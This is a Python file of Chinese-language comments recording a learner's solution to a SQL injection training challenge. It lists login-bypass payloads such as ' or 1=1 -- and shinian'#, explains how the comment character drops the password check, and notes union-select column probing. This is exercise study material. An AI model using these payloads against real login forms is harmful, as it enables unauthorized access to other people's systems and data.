#!/usr/bin/python
# coding: utf-8

# 测试网址
# http://www.qlcoder.com/train/admin

# 方法一: 注释
# username: shinian' #
# username: he' or 1=1 #
# 第二句可以得到表中所有数据, 还可以尝试一下的
# ' or 1=1--
# " or 1=1--
# or 1=1--
# ' or 'a'='a
# " or "a"="a
# ') or ('a'='a

# SQL1登录入口使用的语句是：
# SELECT * FROM USERS WHERE username = '${username}' and password = '${password}';

# 如果该SQL有返回结果，那么以${username}登录进去系统，否则登录失败。
# 比如我们用户名输入shinian，密码输入hardtoget，那么SQL语句变为
# SELECT * FROM USERS WHERE username = 'shinian' and password = 'hardtoget';
# 但是由于shinian的密码并不是hardtoget，所以该SQL语句没有任何返回，于是登录失败。

# 但如果我们用户名输入shinian'#，密码留空，那么SQL语句变为：
# SELECT * FROM USERS WHERE username = 'shinian'# and password = '';
# 注意#表示注释符号(-- 也可以，但是注意后面要加空格)，去掉注释的SQL语句为：
# SELECT * FROM USERS WHERE username = 'shinian'
# 这个SQL语句有返回（题目中明确告知shinian是管理员账户），所以就以shinian的身份登录进系统了，从而拿到SQL1的答案。

# 下一步就是 sql注入2 盲注


# 方法二: 万能密码
# username: any
# passwd: 1' or '1' = '1

# 方法三: 开始sql注入  post型的
# 二分法测得:
# shinian' order by 24; --
# select的查询字段有 24 个(有点多, 记得 -- 后要有空格)
# shinian' union select 1,1,1,1,1, 1,1,1,1,1, 1,1,1,1,1, 1,1,1,1,1, 1,1,1,1; --
# 好想没有回显
